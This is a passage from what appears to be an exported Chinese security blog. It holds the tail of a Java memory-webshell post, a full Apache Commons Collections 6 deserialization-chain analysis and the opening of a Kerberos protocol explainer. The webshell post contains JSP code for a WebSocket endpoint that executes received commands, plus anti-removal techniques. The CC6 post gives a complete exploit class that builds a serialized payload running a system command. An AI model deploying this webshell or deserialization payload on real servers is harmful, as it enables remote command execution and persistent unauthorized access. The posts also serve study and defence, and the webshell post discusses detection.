class="type">int</span> c;</span><br><span class="line">                        <span class="type">StringBuilder</span> <span class="variable">all</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                        <span class="keyword">while</span> ((c = in.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                            all.append((<span class="type">char</span>)c);</span><br><span class="line">                        &#125;</span><br><span class="line">                        in.close();</span><br><span class="line">                        p.waitFor();</span><br><span class="line">                        session.getBasicRemote().sendText(all.toString());</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(cmdEndpoint.class, path).build();</span><br><span class="line">    <span class="type">WsServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> == container.findMapping(path)) &#123;</span><br><span class="line">            container.addEndpoint(configEndpoint);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (DeploymentException e) &#123;</span><br><span class="line">        out.println(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h1 id="查杀内存马"><a href="#查杀内存马" class="headerlink" title="查杀内存马"></a>查杀内存马</h1><ul>
<li><p>c0ny1 师傅<br>  将 <code>filterMaps</code> 中的所有 <code>filterMap</code> 遍历出来，然后提供了 <code>dumpclass</code>，显然，如果获得目标类的 <code>class</code> 反编译代码，加入人为判断的模式，就可以知道 <code>filter</code> 代码中是否有恶意操作了。</p>
</li>
<li><p>c0ny1 和 jweny 师傅<br> 内存马最大的特点就是储存在内存，无文件落地，那也就代表了这个类对应的 ClassLoader 目录下没有对应的 class 文件</p>
</li>
<li><p>利用 VisualVM 来监控 Mbeans 来检测内存马的思路，原理是在注册类似 Filter 的时候会触发 registerJMX 的操作来注册 mbean</p>
</li>
<li><p>宽字节安全<br>  扫字节码的方式。</p>
</li>
</ul>
<h1 id="如何杀掉内存马"><a href="#如何杀掉内存马" class="headerlink" title="如何杀掉内存马"></a>如何杀掉内存马</h1><p>对于非Agent马两种思路：</p>
<ul>
<li>从系统中移除该对象。（推荐）</li>
<li>访问时抛异常（或跳过调用），中断此次调用。</li>
</ul>
<p>对于Agent马：retransform。</p>
<h1 id="如何防止Java-Agent内存马被杀"><a href="#如何防止Java-Agent内存马被杀" class="headerlink" title="如何防止Java Agent内存马被杀"></a>如何防止Java Agent内存马被杀</h1><ul>
<li><p>注入 class 到当前线程中，然后实例化注入内存马</p>
</li>
<li><p>通过执行 Java 代码来卸载掉这个 mbean 来隐藏自己</p>
</li>
<li><p>threedr3am 师傅提出了，阻止后续 javaagent 加载的方式，防止webshell 被查杀。<a href="https://github.com/threedr3am/ZhouYu">Github项目</a></p>
</li>
</ul>
<p>关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vmObj = VirtualMachine.attach(args[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">String</span> <span class="variable">agentpath</span> <span class="operator">=</span> ZhouYu.class.getProtectionDomain().getCodeSource().getLocation().getFile();</span><br><span class="line">    <span class="keyword">if</span> (vmObj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            vmObj.loadAgent(agentpath, args[<span class="number">1</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            vmObj.loadAgent(agentpath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">null</span> != vmObj) &#123;</span><br><span class="line">        vmObj.detach();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a><center>结语</center></h1><p>关于内存马的攻防，还一直在不停迭代当中，就目前而言，还并没有行之有效的对内存马查杀方法，因为当前的查杀方法都有其弊端。</p>
<p>内存马可以配合JNDI注入，命令执行，普通马改为内存马等，配合使用。目前红队内网站稳脚跟的首选。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>CC6攻击链分析与复现</title>
    <url>/JAVA%E5%AE%89%E5%85%A8/CC6%E6%94%BB%E5%87%BB%E9%93%BE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么不从CC1写？大同小异懂一个基本都懂了,而且CC6利用也更多，生成的payload也更短</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown96074895_p11.jpg"></p>
<span id="more"></span>

<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>CC6全称为<code>Commons Collections6</code> （Apache Commons Collections）是一个用来处理集合<code>Collection</code>的开源工具包，比如你可以用来将一个对象拷贝多份并存放到一个Bag对象中（这个看来没有多大用处），得到两个集合里相同的元素，删除一个集合里的元素并返回删除的元素，还有除了通过一个集合里的key得到value外，还可以通过value 得到key，也就是说这个集合里的value是唯一的，另外还可以将一个集合里的key和value值对调，得到一个集合里的某一key之后的另一个 key值。</p>
<ul>
<li><p>要复现的话下载<code>Collections3.x</code>系列版本即可 ，<a href="https://commons.apache.org/proper/commons-collections/download_collections.cgi" title="官方链接">官方链接</a>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_aTfFRN4LZR.png"></p>
</li>
</ul>
<h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>在分析CC6利用链之前，得先知道<code>TransformedMap</code> 的运行原理。</p>
<p><code>TransformedMap</code>⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个回调。可以通过下⾯这⾏代码对<code>innerMap</code>进⾏修饰，传出的<code>outerMap</code>即是修饰后的Map：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, keyTransformer,valueTransformer);</span><br></pre></td></tr></table></figure>

<p>其中，<code>keyTransformer</code>是处理新元素的Key的回调，<code>valueTransformer</code>是处理新元素的value的回调。</p>
<p>这⾥所说的 “回调” ，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了<code>Transformer</code>接⼝的类。</p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是⼀个接⼝，它只有⼀个待实现的⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">     <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>TransformedMap在转换Map的新元素时，就会调⽤transform⽅法，这个过程就类似在调⽤⼀个 “回调函数”，这个回调的参数是原始对象。</p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><code>ConstantTransformer</code>是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个<br>对象，并在transform⽅法将这个对象再返回：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作。</p>
<p>InvokerTransformer</p>
<p>InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序<br>列化能执⾏任意代码的关键。</p>
<p>在实例化这个InvokerTransformer时，需要传⼊三个参数，<strong>第⼀个参数是待执⾏的⽅法名</strong>，<strong>第⼆个参数<br>是这个函数的参数列表的参数类型</strong>，<strong>第三个参数是传给这个函数的参数列表</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line"> <span class="built_in">super</span>();</span><br><span class="line"> iMethodName = methodName;</span><br><span class="line"> iParamTypes = paramTypes;</span><br><span class="line"> iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后⾯的回调transform⽅法，就是执⾏了input对象的iMethodName⽅法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">   <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">   <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line"> &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> +iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串<br>在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，我们画⼀个图做示意：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_bZ79KQAduY.png"></p>
<p>它的代码也⽐较简单：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">   <span class="built_in">super</span>();</span><br><span class="line">   iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">   object = iTransformers[i].transform(object);</span><br><span class="line"> &#125;</span><br><span class="line">   <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="理解demo"><a href="#理解demo" class="headerlink" title="理解demo"></a>理解demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我创建了⼀个<code>ChainedTransformer</code>，其中包含两个<code>Transformer</code>：第⼀个是<code>ConstantTransformer</code>，<br>直接返回当前环境的Runtime对象；第⼆个是<code>InvokerTransformer</code>，执⾏Runtime对象的exec⽅法，参<br>数是 <code>/System/Applications/Calculator.app/Contents/MacOS/Calculator </code>。</p>
<p>当然，这个<code>transformerChain</code>只是⼀系列回调，我们需要⽤其来包装innerMap，使⽤的前⾯说到的<br><code>TransformedMap.decorate</code> ：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>

<p>触发回调就是向Map中放⼊⼀个新的元素：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="Commons-Collections6"><a href="#Commons-Collections6" class="headerlink" title="Commons Collections6"></a>Commons Collections6</h1><p>理解了TransformedMap之后可以知道CC链利用前提是序列化和反序列化。</p>
<ul>
<li><p>序列化需要2个条件：</p>
<ol>
<li><p>该类必须实现<code>java.io.Serlalizable</code>接口</p>
</li>
<li><p>该类的所有属性必须是可序列化的，如果⼀个属性是不可序列化的，则属性必须标明是短暂的。</p>
<p>比如：<a href="https://so.csdn.net/so/search?q=static&spm=1001.2101.3001.7020" title="static">static</a>，transient 修饰的变量不可被序列化</p>
</li>
</ol>
</li>
</ul>
<h3 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h3><p>不能new 一个Runtime类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Runtime runtime;</span><br><span class="line">        runtime = <span class="keyword">new</span> <span class="title class_">Runtime</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Runtime是一个单例类，单例类是不能够进行new的。</strong></p>
<h2 id="CC链利用的类"><a href="#CC链利用的类" class="headerlink" title="CC链利用的类"></a>CC链利用的类</h2><p>CC链的原理就是利用反射获取类，放到readObject方法中，向TransformedMap中放入一个新元素触发回调。</p>
<h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HaspMap.readObject.hash()</span><br><span class="line">  --&gt;TiedMapEntry.hashCode()</span><br><span class="line">    --&gt;TiedMapEntry.getValue()</span><br><span class="line">      --&gt;LazyMap.get()</span><br><span class="line">        --&gt;ChainedTransformer.transformer()</span><br><span class="line">          --&gt;InvokerTransformer.transformer()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我这里分析用的是LazyMap方法，是因为ysoserial用的也是LazyMap方法，但是实际上还有2个可以用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_mYLoJ0Cbf8.png"></p>
<p>也就是一共3个方法可用。</p>
<ul>
<li><p>在回到LazyMap， 思路是看谁调用了get</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_ZKsMnjE3px.png"></p>
</li>
</ul>
<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>在TiedMapEntry类中可以看到hashCode()方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_3KpnS7FQxN.png"></p>
<p>方法中调用了getValue()跟进</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_EewtjgEqeB.png"></p>
<p>链子：<code>TiedMapEntry.hashCode--&gt;TiedMapEntry.getValue--&gt;get</code></p>
<p>所以可以把map.get改为LazyMap.get。</p>
<h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap.readObject中调用了hash方法</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QXZW0qXMpR.png"></p>
<p>跟进hash方法，会调用hashCode方法，这个就和上面的接上了</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_GSsywnWxz0.png"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> src;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>((Filename)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">//TiedMapEntry.getValue()中调用了get方法</span></span><br><span class="line">        <span class="comment">//TiedMapEntry.hashCode--&gt;getValue--&gt;get</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="comment">//tiedMapEntry.getValue();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryfield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//将lazymap对象的factory变量赋值</span></span><br><span class="line">        factoryfield.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个过程中会用到put，但是put就会触发hash，但是我们不想在这里执行弹计算器；所以先在第40行LazyMap.decorate中整一无关的类对象，然后在第52-56行进行反射重新给lazyMap赋值，这样put的时候就不会弹计算器，但是序列化的过程是正确的。</p>
<ul>
<li><p>但是执行会出现这个错误</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_81zOzG4QUI.png"></p>
</li>
</ul>
<p>这个是因为在3.2.2版本中，禁用了序列化时调用<code>org.apache.commons.collections.functors.InvokerTransformer</code> ，改为false即可。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Js4bSTo9m1.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>CC6</tag>
      </tags>
  </entry>
  <entry>
    <title>Kerberos详解</title>
    <url>/windows/Kerberos/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又水一篇文，不愧是我🤣</p>
<span id="more"></span>

<h1 id="kerberos-协议概述"><a href="#kerberos-协议概述" class="headerlink" title="kerberos 协议概述"></a>kerberos 协议概述</h1><p><code>Kerberos</code>是一种由MIT（麻省理工大学）提出的一种<strong>网络身份验证协议</strong>。它旨在通过使用密钥加密技术为<code>客户端</code>&#x2F;<code>服务器应用程序</code>提供<strong>强身份验证</strong>。</p>
<p>在<code>Kerberos</code>协议中主要是有三个角色的存在：</p>
<ol>
<li><p>访问服务的<code>Client</code>(以下表述为Client 或者用户)</p>
</li>
<li><p>提供服务的<code>Server</code>(以下表述为服务)</p>
</li>
<li><p><code>KDC</code>（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</p>
</li>
</ol>
<p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在<code>Kerberos</code>中<code>Client</code>是否有权限访问<code>Server</code>端的服务由<code>KDC</code>发放的票据来决定。</p>
<p>kerberos的简化认证认证过程如下图</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_vEQeoGFNDQ.png"></p>
<ol>
<li><p><code>AS_REQ</code>: Client向KDC发起AS_REQ,请求凭据是<strong>Client hash加密的时间戳</strong></p>
</li>
<li><p><code>AS_REP</code>: KDC使用Client hash进行解密，如果结果正确就返回用<strong>krbtgt hash加密的TGT票据</strong>，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</p>
</li>
<li><p><code>TGS_REQ</code>: Client<strong>凭借TGT票据向KDC发起针对特定服务的</strong><code>TGS_REQ</code><strong>请求</strong></p>
</li>
<li><p><code>TGS_REP</code>: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</p>
</li>
<li><p><code>AP_REQ</code>: Client拿着TGS票据去请求服务</p>
</li>
<li><p><code>AP_REP</code>: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</p>
</li>
</ol>
<h1 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h1><h2 id="pvno"><a href="#pvno" class="headerlink" title="pvno"></a>pvno</h2><p>kerberos 版本号</p>
<h2 id="msg-type"><a href="#msg-type" class="headerlink" title="msg-type"></a>msg-type</h2><p>类型，AS_REQ对应的就是KRB_AS_REQ(0x0a)</p>
<h2 id="PA-DATA"><a href="#PA-DATA" class="headerlink" title="PA_DATA"></a>PA_DATA</h2><p>主要是一些认证信息。一个列表，包含若干个认证消息用于认证，我们也可以Authenticator。每个认证消息有type和value。</p>
<p>type主要有以下一些</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">            NONE = <span class="number">0</span>,</span><br><span class="line">​            TGS_REQ = <span class="number">1</span>,</span><br><span class="line">​            AP_REQ = <span class="number">1</span>,</span><br><span class="line">​            ENC_TIMESTAMP = <span class="number">2</span>,</span><br><span class="line">​            PW_SALT = <span class="number">3</span>,</span><br><span class="line">​            ENC_UNIX_TIME = <span class="number">5</span>,</span><br><span class="line">​            SANDIA_SECUREID = <span class="number">6</span>,</span><br><span class="line">​            SESAME = <span class="number">7</span>,</span><br><span class="line">​            OSF_DCE = <span class="number">8</span>,</span><br><span class="line">​            CYBERSAFE_SECUREID = <span class="number">9</span>,</span><br><span class="line">​            AFS3_SALT = <span class="number">10</span>,</span><br><span class="line">​            ETYPE_INFO = <span class="number">11</span>,</span><br><span class="line">​            SAM_CHALLENGE = <span class="number">12</span>,</span><br><span class="line">​            SAM_RESPONSE = <span class="number">13</span>,</span><br><span class="line">​            PK_AS_REQ_19 = <span class="number">14</span>,</span><br><span class="line">​            PK_AS_REP_19 = <span 